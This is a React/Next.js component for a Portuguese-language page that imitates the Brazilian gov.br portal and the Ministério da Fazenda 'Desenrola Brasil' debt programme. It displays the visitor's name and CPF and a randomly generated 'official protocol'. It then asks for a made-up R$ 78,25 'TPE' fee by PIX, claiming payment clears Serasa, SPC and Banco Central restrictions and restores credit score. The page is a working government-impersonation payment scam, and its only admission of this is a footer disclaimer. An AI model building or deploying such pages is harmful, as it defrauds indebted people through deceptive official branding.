'use client'

import QRCode from 'qrcode'
import { useEffect, useRef, useState } from 'react'

function onlyDigits(s: string) {
  return String(s || '').replace(/\D/g, '')
}
function formatCPF(v: string) {
  const d = onlyDigits(v).slice(0, 11)
  if (d.length <= 3) return d
  if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3)
  if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6)
  return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9)
}

const VALOR_TPE = 'R$ 78,25'

export default function RegularizacaoClient() {
  const [nome, setNome] = useState('Contribuinte')
  const [cpf, setCpf] = useState('')
  const [proto, setProto] = useState('BR-98421034')
  const [loading, setLoading] = useState(false)
  const [pixCode, setPixCode] = useState('')
  const [qrSrc, setQrSrc] = useState('')
  const [copiado, setCopiado] = useState(false)
  const [erro, setErro] = useState('')
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    let n = params.get('nome') || ''
    let c = params.get('cpf') || ''
    try {
      n = n || localStorage.getItem('site.nome') || 'Contribuinte'
      c = c || localStorage.getItem('site.cpf') || ''
    } catch {}
    setNome(n.toUpperCase())
    setCpf(c)
    setProto('BR-' + Math.floor(10000000 + Math.random() * 90000000))
  }, [])

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current)
    }
  }, [])

  async function gerarPix() {
    setLoading(true)
    setErro('')
    try {
      const resp = await fetch('/api/pix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tipo: 'tpe' }),
      })
      const result = await resp.json()
      if (!result.ok) throw new Error(result.error || 'Erro ao gerar PIX')
      const code = result.qrCode || ''
      if (!code) throw new Error('Código PIX não recebido')

      setPixCode(code)
      if (result.qrCodeBase64) {
        setQrSrc(result.qrCodeBase64)
      } else {
        try {
          setQrSrc(await QRCode.toDataURL(code, { width: 190, margin: 1 }))
        } catch {
          setQrSrc('https://api.qrserver.com/v1/create-qr-code/?size=190x190&data=' + encodeURIComponent(code))
        }
      }

      const transactionId = result.transactionId
      if (transactionId) {
        pollRef.current = setInterval(async () => {
          try {
            const st = await fetch('/api/pix/status?id=' + encodeURIComponent(transactionId), { cache: 'no-store' })
            const j = await st.json()
            const status = String(j.status || '').toLowerCase()
            if (['paid', 'completed', 'approved', 'authorized'].includes(status)) {
              if (pollRef.current) clearInterval(pollRef.current)
              alert('Pagamento confirmado! Sua Certidão Negativa de Débitos será emitida em instantes.')
            }
          } catch {}
        }, 4500)
      }
    } catch (e) {
      setErro(e instanceof Error ? e.message : 'Erro ao gerar PIX')
    } finally {
      setLoading(false)
    }
  }

  function copiar() {
    navigator.clipboard.writeText(pixCode)
    setCopiado(true)
    setTimeout(() => setCopiado(false), 2500)
  }

  return (
    <div className="reg-root">
      <style>{CSS}</style>

      <div className="barra-brasil">
        <div className="barra-brasil-left">
          <span className="barra-brasil-logo">
            <svg className="flag-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 14" width="16" height="11">
              <rect width="20" height="14" fill="#009c3b" />
              <polygon points="10,1.8 18.2,7 10,12.2 1.8,7" fill="#ffdf00" />
              <circle cx="10" cy="7" r="3.2" fill="#002776" />
              <path d="M 6.9 7.4 A 3.2 3.2 0 0 1 13.1 6.5 A 3.2 3.2 0 0 0 6.9 7.4 Z" fill="#ffffff" />
            </svg>
            <strong>BRASIL</strong>
          </span>
        </div>
        <nav className="barra-brasil-nav">
          <a href="javascript:void(0)">Simplifique!</a>
          <a href="javascript:void(0)">Participe</a>
          <a href="javascript:void(0)">Acesso à informação</a>
          <a href="javascript:void(0)">Legislação</a>
          <a href="javascript:void(0)">Canais</a>
        </nav>
      </div>

      <header className="gov-header">
        <div className="gov-header-inner">
          <div className="gov-brand">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src="/images/iconegov.png" alt="gov.br" className="gov-logo-img" />
            <div className="gov-title-block">
              <span className="gov-dept">Ministério da Fazenda</span>
              <span className="gov-service">Programa Desenrola Brasil</span>
            </div>
          </div>
        </div>
      </header>

      <div className="breadcrumb-bar">
        <div className="breadcrumb-inner">
          Você está aqui: Página Inicial <span>{'>'}</span> Serviços <span>{'>'}</span> Programa Desenrola Brasil{' '}
          <span>{'>'}</span> <strong>Regularização Cadastral e TPE</strong>
        </div>
      </div>

      <main className="main-wrap">
        <div className="upsell-container">
          <div className="upsell-title">
            <span className="status-badge">ACORDO HOMOLOGADO COM SUCESSO</span>
            <h1>Guia de Regularização Cadastral (TPE)</h1>
            <p>Emissão de Certidão Negativa e Baixa de Restrições Financeiras</p>
          </div>

          <div className="contribuinte-box">
            <div>
              <strong>Beneficiário(a):</strong> <span>{nome}</span>
            </div>
            <div>
              <strong>Documento (CPF):</strong> <span>{cpf ? formatCPF(cpf) : 'Registrado no Sistema'}</span>
            </div>
            <div>
              <strong>Protocolo Oficial:</strong> <span>{proto}</span>
            </div>
            <div>
              <strong>Situação:</strong> <span style={{ color: '#168821' }}>Acordo Confirmado — Aguardando TPE</span>
            </div>
          </div>

          <div className="card">
            <p>
              Para a emissão da sua <strong>Certidão Negativa de Débitos (CND)</strong> e para a efetivação da baixa
              automática das restrições nos bancos de dados do <strong>Banco Central (SCR), Serasa Experian e SPC</strong>,
              é necessária a liquidação da Taxa de Processamento Eletrônico (TPE).
            </p>
            <br />
            <p>A TPE cobre os custos operacionais de compensação e registro digital perante o Sistema Financeiro Nacional.</p>
          </div>

          <div className="value-card">
            <div className="value-label">VALOR DA TAXA OFICIAL (TPE)</div>
            <div className="value-amount">{VALOR_TPE}</div>
            <div className="value-sub">Taxa única para baixa imediata de restrições</div>
          </div>

          <div className="process-card">
            <h3>Processamento e Benefícios Imediatos</h3>
            <ul>
              <li>Confirmação instantânea do pagamento via Banco Central</li>
              <li>Emissão da Certidão Negativa de Débitos com autenticação digital</li>
              <li>Atualização e restabelecimento do Score em até 24 horas</li>
              <li>Desbloqueio para novas linhas de crédito e financiamentos</li>
            </ul>
          </div>

          {!pixCode && (
            <button className="btn-pay" onClick={gerarPix} disabled={loading}>
              <span>{loading ? 'GERANDO GUIA OFICIAL...' : 'EMITIR GUIA PIX DE REGULARIZAÇÃO'}</span>
            </button>
          )}

          {erro && <div className="error-msg">{erro}</div>}

          {pixCode && (
            <div className="pix-section show">
              <h3>Guia Oficial de Pagamento Gerada!</h3>
              <p className="pix-sub">Utilize o aplicativo do seu banco para ler o QR Code ou cole a chave PIX:</p>
              <div className="qr-wrap">
                {/* eslint-disable-next-line @next/next/no-img-element */}
                {qrSrc ? <img src={qrSrc || '/placeholder.svg'} alt="QR Code PIX" width={190} height={190} /> : null}
              </div>
              <div className="pix-code-box">{pixCode}</div>
              <button className="btn-copy" onClick={copiar}>
                {copiado ? 'Código copiado!' : 'Copiar Código PIX'}
              </button>
              <div className="checking-payment show">
                <div className="checking-dot" />
                Aguardando confirmação do Banco Central...
              </div>
            </div>
          )}

          <p className="secure-text">
            <svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
              />
            </svg>
            Ambiente Criptografado e Seguro — Ministério da Fazenda
          </p>
        </div>
      </main>

      <footer className="site-footer">
        <div className="site-footer-inner">
          <div className="gv">
            gov<span>.br</span>
          </div>
          <p>Este é um site privado e independente, sem vínculo com o Governo Federal ou o gov.br.</p>
          <p>
            <strong>Programa Desenrola Brasil</strong>
          </p>
        </div>
      </footer>
    </div>
  )
}

const CSS = `
.reg-root { --gov-blue: #1351B4; --gov-blue-dark: #0C326F; --gov-blue-navy: #071D41; --gov-blue-soft: #EFF6FF; --gov-blue-border: #BFDBFE; --gov-green: #168821; --gov-green-soft: #ECFDF5; --gov-green-border: #A7F3D0; --gov-gold: #FDB913; --gov-bg: #F0F2F5; --text-heading: #0F172A; --text-body: #334155; --text-muted: #64748B; }
.reg-root, .reg-root *, .reg-root *::before, .reg-root *::after { box-sizing: border-box; margin: 0; padding: 0; }
.reg-root { font-family: 'Inter', 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--gov-bg); color: var(--text-body); min-height: 100vh; min-height: 100dvh; display: flex; flex-direction: column; line-height: 1.5; -webkit-font-smoothing: antialiased; }
.reg-root .barra-brasil { background: #000; color: #fff; font-size: 11px; font-weight: 600; padding: 5px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #1f2937; }
.reg-root .barra-brasil-left { display: flex; align-items: center; gap: 8px; }
.reg-root .barra-brasil-logo { display: flex; align-items: center; gap: 6px; color: #fff; font-weight: 800; font-size: 11.5px; letter-spacing: 0.04em; }
.reg-root .flag-icon-svg { display: inline-block; vertical-align: middle; border-radius: 1.5px; flex-shrink: 0; }
.reg-root .barra-brasil-nav { display: flex; align-items: center; gap: 12px; }
.reg-root .barra-brasil-nav a { color: #9ca3af; text-decoration: none; font-size: 10px; }
@media (max-width: 540px) { .reg-root .barra-brasil-nav { display: none; } }
.reg-root .gov-header { background: #fff; border-bottom: 2.5px solid var(--gov-blue); box-shadow: 0 1px 4px rgba(0,0,0,0.06); padding: 10px 16px; }
.reg-root .gov-header-inner { max-width: 720px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; }
.reg-root .gov-brand { display: flex; align-items: center; gap: 10px; }
.reg-root .gov-logo-img { height: 32px; width: auto; }
.reg-root .gov-title-block { border-left: 1px solid #cbd5e1; padding-left: 10px; display: flex; flex-direction: column; }
.reg-root .gov-dept { font-size: 10.5px; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: 0.05em; }
.reg-root .gov-service { font-size: 12.5px; font-weight: 800; color: var(--gov-blue); }
.reg-root .breadcrumb-bar { background: #e2e8f0; border-bottom: 1px solid #cbd5e1; padding: 6px 16px; font-size: 11.5px; color: #475569; }
.reg-root .breadcrumb-inner { max-width: 720px; margin: 0 auto; }
.reg-root .breadcrumb-bar span { color: #94a3b8; margin: 0 2px; }
.reg-root .breadcrumb-bar strong { color: var(--gov-blue); font-weight: 700; }
.reg-root .main-wrap { flex: 1; padding: 24px 16px 40px; display: flex; justify-content: center; }
.reg-root .upsell-container { max-width: 580px; width: 100%; }
.reg-root .status-badge { display: inline-flex; align-items: center; gap: 6px; background: var(--gov-green-soft); color: var(--gov-green); border: 1px solid var(--gov-green-border); padding: 4px 14px; border-radius: 50px; font-size: 11.5px; font-weight: 800; letter-spacing: 0.03em; margin-bottom: 12px; }
.reg-root .upsell-title { text-align: center; margin-bottom: 16px; }
.reg-root .upsell-title h1 { font-size: 22px; font-weight: 900; color: var(--text-heading); line-height: 1.25; letter-spacing: -0.02em; }
.reg-root .upsell-title p { font-size: 13.5px; color: var(--text-muted); margin-top: 6px; }
.reg-root .card { background: #fff; border-radius: 14px; border: 1px solid #e2e8f0; border-left: 4px solid var(--gov-blue); padding: 20px; margin-top: 16px; box-shadow: 0 4px 14px rgba(15,23,42,0.05); }
.reg-root .contribuinte-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 14px 16px; margin-top: 14px; font-size: 13px; line-height: 1.7; }
.reg-root .contribuinte-box strong { color: #1e293b; }
.reg-root .contribuinte-box span { color: var(--gov-blue); font-weight: 700; }
.reg-root .card p { font-size: 13.5px; color: var(--text-body); line-height: 1.6; }
.reg-root .value-card { background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%); border-radius: 14px; border: 1.5px solid var(--gov-blue-border); border-left: 4px solid var(--gov-blue); padding: 22px 18px; margin-top: 16px; text-align: center; box-shadow: 0 4px 14px rgba(19,81,180,0.06); }
.reg-root .value-label { font-size: 11.5px; font-weight: 800; color: var(--gov-blue-dark); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 4px; }
.reg-root .value-amount { font-size: 38px; font-weight: 900; color: var(--gov-blue); letter-spacing: -0.02em; }
.reg-root .value-sub { font-size: 12.5px; color: #475569; margin-top: 2px; font-weight: 500; }
.reg-root .process-card { background: #fff; border-radius: 14px; border: 1px solid #e2e8f0; border-left: 4px solid var(--gov-green); padding: 20px; margin-top: 16px; box-shadow: 0 4px 14px rgba(15,23,42,0.05); }
.reg-root .process-card h3 { font-size: 15px; font-weight: 800; color: var(--text-heading); margin-bottom: 12px; display: flex; align-items: center; gap: 6px; }
.reg-root .process-card ul { list-style: none; padding: 0; }
.reg-root .process-card li { font-size: 13px; color: var(--text-body); padding: 6px 0; display: flex; align-items: center; gap: 8px; border-bottom: 1px dashed #f1f5f9; }
.reg-root .process-card li:last-child { border-bottom: none; }
.reg-root .process-card li::before { content: '✓'; color: var(--gov-green); font-size: 14px; font-weight: 900; }
.reg-root .btn-pay { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 16px 20px; margin-top: 20px; border: none; border-radius: 26px; background: var(--gov-green); color: #fff; font-size: 15px; font-weight: 800; cursor: pointer; font-family: inherit; text-transform: uppercase; letter-spacing: 0.03em; transition: all 0.2s; box-shadow: 0 4px 14px rgba(22,136,33,0.35); }
.reg-root .btn-pay:hover { background: #13741c; transform: translateY(-1px); box-shadow: 0 6px 18px rgba(22,136,33,0.45); }
.reg-root .btn-pay:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
.reg-root .secure-text { text-align: center; margin-top: 14px; font-size: 12px; color: var(--text-muted); display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: 600; }
.reg-root .pix-section { background: #fff; border-radius: 16px; border: 2px solid var(--gov-blue); padding: 24px 18px; margin-top: 20px; text-align: center; box-shadow: 0 6px 20px rgba(19,81,180,0.08); animation: popUp 0.3s ease-out forwards; }
.reg-root .pix-section h3 { font-size: 16px; font-weight: 800; color: var(--text-heading); margin-bottom: 4px; }
.reg-root .pix-section .pix-sub { font-size: 12.5px; color: var(--text-muted); margin-bottom: 16px; }
.reg-root .qr-wrap { justify-content: center; margin-bottom: 16px; padding: 10px; background: #fff; border-radius: 12px; border: 1px solid #e2e8f0; display: inline-block; }
.reg-root .qr-wrap img { display: block; width: 190px; height: 190px; }
.reg-root .pix-code-box { background: #f8fafc; border: 1px dashed #94a3b8; border-radius: 8px; padding: 12px; word-break: break-all; font-family: monospace; font-size: 11.5px; color: #334155; margin-bottom: 14px; text-align: left; user-select: all; }
.reg-root .btn-copy { padding: 12px 24px; border: none; border-radius: 20px; background: var(--gov-blue); color: #fff; font-size: 13.5px; font-weight: 700; cursor: pointer; font-family: inherit; transition: all 0.2s; box-shadow: 0 2px 8px rgba(19,81,180,0.25); }
.reg-root .btn-copy:hover { background: var(--gov-blue-dark); }
.reg-root .error-msg { color: #dc2626; font-size: 13px; text-align: center; margin-top: 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
@keyframes popUp { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
.reg-root .checking-payment { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 16px; font-size: 13px; color: var(--gov-blue); font-weight: 700; }
.reg-root .checking-dot { width: 8px; height: 8px; background: var(--gov-blue); border-radius: 50%; animation: pulse-dot 1.5s infinite; }
@keyframes pulse-dot { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } }
.reg-root .site-footer { background: var(--gov-blue-navy); color: #fff; padding: 20px 16px; margin-top: auto; }
.reg-root .site-footer-inner { max-width: 720px; margin: 0 auto; display: flex; flex-direction: column; gap: 6px; font-size: 11.5px; color: #94a3b8; line-height: 1.6; }
.reg-root .site-footer .gv { font-size: 16px; font-weight: 900; color: #fff; margin-bottom: 2px; }
.reg-root .site-footer .gv span { color: var(--gov-gold); }
.reg-root .site-footer strong { color: #fff; }
`
